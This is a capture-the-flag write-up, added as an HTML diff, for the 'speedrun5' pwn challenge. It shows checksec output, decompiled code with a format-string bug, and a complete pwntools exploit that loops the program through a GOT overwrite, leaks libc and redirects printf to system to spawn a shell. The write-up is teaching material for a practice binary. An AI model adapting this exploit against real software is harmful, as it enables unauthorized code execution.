@@ -1,0 +1,155 @@
+<h1 id="speedrun-5-writeup">Speedrun 5 writeup</h1>
+<p>First I started by checksecing the binary</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">pwn</span><span class="kw">)</span> <span class="ex">eric@Eric:~/OOO/speedrun5$</span> checksec speedrun5</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> <span class="st">&#39;/home/eric/OOO/speedrun5/speedrun5&#39;</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Arch:</span>       amd64-64-little</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">RELRO:</span>      Partial RELRO</span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Stack:</span>      Canary found</span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">NX:</span>         NX enabled</span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>    <span class="ex">PIE:</span>        No PIE <span class="er">(</span><span class="ex">0x400000</span><span class="kw">)</span></span></code></pre></div>
+<p>So the mitigations we have to deal with are NX and a canary on the
+stack. We notice that there is no PIE so we can overwrite a GOT address.
+I assume this will be either a ROP problem (because of NX) or a GOT
+overwrite (no PIE to complicate this)</p>
+<p>Running the binary, we see a greeting</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">pwn</span><span class="kw">)</span> <span class="ex">eric@Eric:~/OOO/speedrun5$</span> ./speedrun5</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Fifth</span> time<span class="st">&#39;s the charm?</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="st">What do you mean this time? AAA</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="st">Interesting AAA</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="st">&lt;{ food for thought</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="st">Safe, yet again.</span></span></code></pre></div>
+<p>So it prints out our buffer right back to us. Let’s see if there is a
+format string vulnerability</p>
+<pre><code>(pwn) eric@Eric:~/OOO/speedrun5$ ./speedrun5
+Fifth time&#39;s the charm?
+What do you mean this time? %p %p %p
+Interesting 0x7ffcaf398cc0 (nil) (nil)
+{H\~~ food for thought
+Safe, yet again.</code></pre>
+<p>Nice. So this leads me to 2 exploit paths. - Bypassing the canary by
+overwriting the return address with a win function (if it exists) using
+%n - Overwrite a GOT address with %n (unsure with what yet though)</p>
+<p>After scrolling through the decompiled input, we don’t find a win
+function. This function is what makes up pretty much the entire binary
+besides the greeting and farewell messages:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> FUN_0040072d<span class="op">(</span><span class="dt">void</span><span class="op">)</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">long</span> in_FS_OFFSET<span class="op">;</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> local_418 <span class="op">[</span><span class="dv">1032</span><span class="op">];</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>  <span class="dt">long</span> local_10<span class="op">;</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>  </span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>  local_10 <span class="op">=</span> <span class="op">*(</span><span class="dt">long</span> <span class="op">*)(</span>in_FS_OFFSET <span class="op">+</span> <span class="bn">0x28</span><span class="op">);</span></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;What do you mean this time? &quot;</span><span class="op">);</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>  read<span class="op">(</span><span class="dv">0</span><span class="op">,</span>local_418<span class="op">,</span><span class="bn">0x400</span><span class="op">);</span></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;Interesting &quot;</span><span class="op">);</span></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span>local_418<span class="op">);</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>  puts<span class="op">(</span><span class="st">&quot; food for thought&quot;</span><span class="op">);</span></span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>local_10 <span class="op">!=</span> <span class="op">*(</span><span class="dt">long</span> <span class="op">*)(</span>in_FS_OFFSET <span class="op">+</span> <span class="bn">0x28</span><span class="op">))</span> <span class="op">{</span></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>                    <span class="co">/* </span><span class="al">WARNING</span><span class="co">: Subroutine does not return */</span></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>    __stack_chk_fail<span class="op">();</span></span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>So there is no buffer overflow, but that’s okay since we don’t need
+it. After our format string is called, there is a call to puts. We can
+overwrite this puts got address with the address of this function so it
+can loop the program for us. (if we chose to do main, we would
+infinitely loop because of the initial puts call in the greeting
+message)</p>
+<p>In order to do that, we must find out where our input lives on the
+stack. After trial and error, 6 is the offset I started seeing my input
+at.</p>
+<p>After that, we can find out what the address of libc is by calling
+printf on the read GOT address. To get it to line up cleanly as our 7th
+argument, we need to consider how our input looks on the stack.</p>
+<p>Our input starts at the 6th offset. Since 64 bit has addresses in 8
+bytes, and we are going to be sending <code>%?$s</code>, that’s 4 bytes.
+In order to fill up the entire 6th argument, we need 4 more bytes of
+padding. So to cleanly read the got address, we need to send
+<code>%7$sAAAA</code>, which fills up the 8 bytes and then right after
+we will see where the resolved libc address of read is. Then, we can
+find out the libc base by subtracting the leaked libc base -
+<code>libc.sym['read']</code>.</p>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">pwn</span><span class="kw">)</span> <span class="ex">eric@Eric:~/OOO/speedrun5$</span> python3 solve.py</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Starting local process <span class="st">&#39;./speedrun5&#39;</span>: pid 21406</span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> <span class="at">---</span> STAGE 1 <span class="at">---</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Loop established</span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> <span class="at">---</span> STAGE 2 <span class="at">---</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Leaked read@got: 0x71155cf1ba80</span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Libc Base: 0x71155ce00000</span></code></pre></div>
+<p>After we find out the libc base, we can find the address of system,
+which would be <code>Libc.sym['system']</code></p>
+<p>Now, to get into stage 3 of the exploit, we need to overwrite the
+printf call with the address of system. That way, when we get into the
+loop again, it will prompt us for input with the read call, we can send
+‘bin/sh’ and printf will call that, meaning it will call system(/bin/sh)
+which pops a shell for us.</p>
+<p>Putting that altogether, we have our exploit:</p>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>exe <span class="op">=</span> <span class="st">&#39;./speedrun5&#39;</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>elf <span class="op">=</span> context.binary <span class="op">=</span> ELF(exe, checksec<span class="op">=</span><span class="va">False</span>)</span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>p <span class="op">=</span> process(exe)</span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>libc <span class="op">=</span> elf.libc</span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>OFFSET <span class="op">=</span> <span class="dv">6</span></span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> send_payload(payload):</span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a>    p.sendline(payload)</span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a>    <span class="cf">try</span>: </span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a>        p.recvuntil(<span class="st">b&quot;Interesting &quot;</span>) </span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a>    <span class="cf">except</span>: </span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a>        <span class="cf">pass</span></span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a>writes <span class="op">=</span> {elf.got[<span class="st">&#39;puts&#39;</span>]: <span class="bn">0x40072d</span>}</span>
+<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> fmtstr_payload(OFFSET, writes)</span>
+<span id="cb6-19"><a href="#cb6-19" aria-hidden="true" tabindex="-1"></a>send_payload(payload)</span>
+<span id="cb6-20"><a href="#cb6-20" aria-hidden="true" tabindex="-1"></a>log.success(<span class="st">&quot;Loop established&quot;</span>)</span>
+<span id="cb6-21"><a href="#cb6-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-22"><a href="#cb6-22" aria-hidden="true" tabindex="-1"></a>leak_payload <span class="op">=</span> <span class="st">b&quot;%7$sAAAA&quot;</span> <span class="op">+</span> p64(elf.got[<span class="st">&#39;read&#39;</span>])</span>
+<span id="cb6-23"><a href="#cb6-23" aria-hidden="true" tabindex="-1"></a>send_payload(leak_payload)</span>
+<span id="cb6-24"><a href="#cb6-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-25"><a href="#cb6-25" aria-hidden="true" tabindex="-1"></a>raw_leak <span class="op">=</span> p.recvuntil(<span class="st">b&quot;AAAA&quot;</span>)[:<span class="op">-</span><span class="dv">4</span>] </span>
+<span id="cb6-26"><a href="#cb6-26" aria-hidden="true" tabindex="-1"></a>leaked_addr <span class="op">=</span> u64(raw_leak.ljust(<span class="dv">8</span>, <span class="st">b&quot;</span><span class="ch">\x00</span><span class="st">&quot;</span>))</span>
+<span id="cb6-27"><a href="#cb6-27" aria-hidden="true" tabindex="-1"></a>log.success(<span class="ss">f&quot;Leaked read@got: </span><span class="sc">{</span><span class="bu">hex</span>(leaked_addr)<span class="sc">}</span><span class="ss">&quot;</span>)</span>
+<span id="cb6-28"><a href="#cb6-28" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-29"><a href="#cb6-29" aria-hidden="true" tabindex="-1"></a>libc.address <span class="op">=</span> leaked_addr <span class="op">-</span> libc.symbols[<span class="st">&#39;read&#39;</span>]</span>
+<span id="cb6-30"><a href="#cb6-30" aria-hidden="true" tabindex="-1"></a>log.success(<span class="ss">f&quot;Libc Base: </span><span class="sc">{</span><span class="bu">hex</span>(libc.address)<span class="sc">}</span><span class="ss">&quot;</span>)</span>
+<span id="cb6-31"><a href="#cb6-31" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-32"><a href="#cb6-32" aria-hidden="true" tabindex="-1"></a>writes <span class="op">=</span> {elf.got[<span class="st">&#39;printf&#39;</span>]: libc.symbols[<span class="st">&#39;system&#39;</span>]}</span>
+<span id="cb6-33"><a href="#cb6-33" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> fmtstr_payload(OFFSET, writes)</span>
+<span id="cb6-34"><a href="#cb6-34" aria-hidden="true" tabindex="-1"></a>send_payload(payload)</span>
+<span id="cb6-35"><a href="#cb6-35" aria-hidden="true" tabindex="-1"></a>log.success(<span class="st">&quot;Overwrite complete&quot;</span>)</span>
+<span id="cb6-36"><a href="#cb6-36" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-37"><a href="#cb6-37" aria-hidden="true" tabindex="-1"></a>p.sendline(<span class="st">b&quot;/bin/sh&quot;</span>)</span>
+<span id="cb6-38"><a href="#cb6-38" aria-hidden="true" tabindex="-1"></a>p.interactive()</span></code></pre></div>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">pwn</span><span class="kw">)</span> <span class="ex">eric@Eric:~/OOO/speedrun5$</span> python3 solve.py</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Starting local process <span class="st">&#39;./speedrun5&#39;</span>: pid 21570</span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Loop established</span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Leaked read@got: 0x7b34e5d1ba80</span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Libc Base: 0x7b34e5c00000</span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Overwrite complete</span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Switching to interactive mode</span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>                                                                               <span class="ex">0</span>                                          <span class="dt">\x</span>00           <span class="dt">\x</span>00                                                             <span class="dt">\x</span>0c                               s                                                                              %aaaaba0<span class="dt">\x</span>10<span class="kw">`</span><span class="ex">$</span>                                                                     </span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="ex">sh:</span> 1: What: not found</span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="ex">sh:</span> 1: Interesting: not found</span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> whoami</span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a><span class="ex">eric</span></span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> </span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Interrupted</span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Stopped process <span class="st">&#39;./speedrun5&#39;</span> <span class="er">(</span><span class="ex">pid</span> 21570<span class="kw">)</span></span></code></pre></div>
+<p>And we popped a shell!</p>
+<h2 id="important-note-to-remember">Important note to remember</h2>
+<p>When we overwrite the call to printf with the address of system, you
+might be wondering why we don’t crash when we call system(‘What do you
+mean this time?’) or system(‘Interesting’)</p>
+<p>Because system spawns a child process to run the system command, if
+it fails, it prints to stdin that it failed but then execution returns
+to the parent, essentially allowing us to keep executing until we hit
+system(/bin/sh) which pops the shell for us.</p>
